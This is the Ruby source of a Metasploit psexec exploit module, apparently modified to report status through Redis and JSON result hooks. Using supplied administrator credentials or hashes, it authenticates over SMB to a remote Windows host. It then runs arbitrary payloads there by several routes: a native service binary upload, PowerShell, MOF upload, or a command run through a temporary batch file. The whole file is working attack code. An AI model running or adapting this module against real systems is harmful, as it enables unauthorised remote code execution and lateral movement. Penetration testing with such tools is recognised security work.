##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# Windows XP systems that are not part of a domain default to treating all
# network logons as if they were Guest. This prevents SMB relay attacks from
# gaining administrative access to these systems. This setting can be found
# under:
#
#  Local Security Settings >
#   Local Policies >
#    Security Options >
#     Network Access: Sharing and security model for local accounts

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::SMB::Client::Psexec
  include Msf::Exploit::Powershell
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec


  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft Windows Authenticated User Code Execution',
      'Description'    => %q{
          This module uses a valid administrator username and password (or
        password hash) to execute an arbitrary payload. This module is similar
        to the "psexec" utility provided by SysInternals. This module is now able
        to clean up after itself. The service created by this tool uses a randomly
        chosen name and description.
      },
      'Author'         =>
        [
          'hdm',
          'Royce Davis <rdavis[at]accuvant.com>', # (@R3dy__) PSExec command module
          'RageLtMan <rageltman[at]sempervictus>' # PSH exploit, libs, encoders
        ],
      'License'        => MSF_LICENSE,
      'Privileged'     => true,
      'DefaultOptions' =>
        {
          'WfsDelay'     => 10,
          'EXITFUNC' => 'thread'
        },
      'References'     =>
        [
          [ 'CVE', '1999-0504'], # Administrator with no password (since this is the default)
          [ 'OSVDB', '3106'],
          [ 'URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx' ],
          [ 'URL', 'https://www.optiv.com/blog/owning-computers-without-shell-access' ],
          [ 'URL', 'http://sourceforge.net/projects/smbexec/' ]
        ],
      'Payload'        =>
        {
          'Space'        => 3072,
          'DisableNops'  => true
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Automatic', { 'Arch' => [ARCH_X86, ARCH_X64] } ],
          [ 'PowerShell', { 'Arch' => [ARCH_X86, ARCH_X64] } ],
          [ 'Native upload', { 'Arch' => [ARCH_X86, ARCH_X64] } ],
          [ 'MOF upload', { 'Arch' => [ARCH_X86, ARCH_X64] } ],
          [ 'Command', { 'Arch' => [ARCH_CMD] } ]
        ],
      'DefaultTarget'  => 0,
      # For the CVE, PsExec was first released around February or March 2001
      'DisclosureDate' => '1999-01-01'
    ))

    register_options(
      [
        OptString.new('SHARE', [false, "The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share", ''])
      ])

    register_advanced_options(
      [
        OptBool.new('ALLOW_GUEST', [true, 'Keep trying if only given guest access', false]),
        OptString.new('SERVICE_FILENAME', [false, 'Filename to to be used on target for the service binary', nil]),
        OptString.new('PSH_PATH', [false, 'Path to powershell.exe', 'Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe']),
        OptString.new('SERVICE_STUB_ENCODER', [false, 'Encoder to use around the service registering stub', nil]),
        OptInt.new('CMD::DELAY', [false, 'A delay (in seconds) before reading the command output and cleaning up', 3])
      ])
  end

  def execute_command_payload(smbshare)
    text = "\\Windows\\Temp\\#{Rex::Text.rand_text_alpha(8..16)}.txt"
    bat  = "\\Windows\\Temp\\#{Rex::Text.rand_text_alpha(8..16)}.bat"
    command = payload.encoded

    output = execute_command_with_output(text, bat, command, smbshare, datastore['RHOST'], delay: datastore['CMD::DELAY'])

    unless output.nil?
      print_good('Command completed successfully!')
      print_good_redis('Command completed successfully!')
      print_status("Output for \"#{ command }\":\n")
      print_status_redis("Output for \"#{ command }\":\n")
      print_line("#{output}\n")
      print_status_redis(output)
    end
  end

  def native_upload_with_workaround(smbshare)
    service_filename = datastore['SERVICE_FILENAME'] || "#{rand_text_alpha(8)}.exe"
    service_encoder = datastore['SERVICE_STUB_ENCODER'] || ''

    # Avoid implementing NTLMSSP on Windows XP
    # https://seclists.org/metasploit/2009/q1/6
    if smb_peer_os == "Windows 5.1"
      connect(versions: [1])
      smb_login
    end
    native_upload(smbshare, service_filename, service_encoder)
  end

  def validate_service_stub_encoder!
    service_encoder = datastore['SERVICE_STUB_ENCODER']
    return if service_encoder.nil? || service_encoder.empty?

    encoder = framework.encoders[service_encoder]
    if encoder.nil?
      raise Msf::OptionValidateError.new(
              {
                      'SERVICE_STUB_ENCODER' => "Failed to find encoder #{service_encoder.inspect}"
              }
      )
    end
  end

  def exploit
    validate_service_stub_encoder!

    # automatically select an SMB share unless one is explicitly specified
    if datastore['SHARE'] && !datastore['SHARE'].blank?
      smbshare = datastore['SHARE']
    elsif target.name == 'Command'
      smbshare = 'C$'
    else
      smbshare = 'ADMIN$'
    end

    print_status("Connecting to the server...")
    print_status_redis("Connecting to the server...")
    begin
      connect
    rescue
      pub_json_result(false,
                      'host connect failed',
                      nil,
                      self.uuid)
    end
    print_status("Authenticating to #{smbhost} as user '#{splitname(datastore['SMBUser'])}'...")
    print_status_redis("Authenticating to #{smbhost} as user '#{splitname(datastore['SMBUser'])}'...")
    begin
      smb_login
    rescue
      pub_json_result(false,
                      'smb login failed',
                      nil,
                      self.uuid)
      return
    end

    if not simple.client.auth_user and not datastore['ALLOW_GUEST']
      print_line(" ")
      print_error(
        "FAILED! The remote host has only provided us with Guest privileges. " +
        "Please make sure that the correct username and password have been provided. " +
        "Windows XP systems that are not part of a domain will only provide Guest privileges " +
        "to network logins by default."
      )
      print_line(" ")
      disconnect
      pub_json_result(false,
                      'The remote host has only provided us with Guest privileges',
                      nil,
                      self.uuid)

      return
    end
    begin
      case target.name
      when 'Automatic'
        if powershell_installed?(smbshare, datastore['PSH_PATH'])
          print_status('Selecting PowerShell target')
          print_status_redis('Selecting PowerShell target')
          execute_powershell_payload
        else
          print_status('Selecting native target')
          print_status_redis('Selecting native target')
          native_upload_with_workaround(smbshare)
        end
      when 'PowerShell'
        print_status_redis('Selecting PowerShell target')
        execute_powershell_payload
      when 'Native upload'
        print_status_redis('Selecting native target')
        native_upload_with_workaround(smbshare)
      when 'MOF upload'
        print_status_redis('Selecting MOF upload')
        mof_upload(smbshare)
      when 'Command'
        print_status_redis('Selecting Command')
        execute_command_payload(smbshare)
      end
    rescue => e
      print_error(e.to_s)
      pub_json_result(false,
                      e.to_s,
                      nil,
                      self.uuid)
      return
    end

    begin
      handler
      disconnect
      pub_json_result(true,
                      nil,
                      nil,
                      self.uuid)
    rescue
      pub_json_result(false,
                      'handler failed',
                      nil,
                      self.uuid)
    end
  end


end
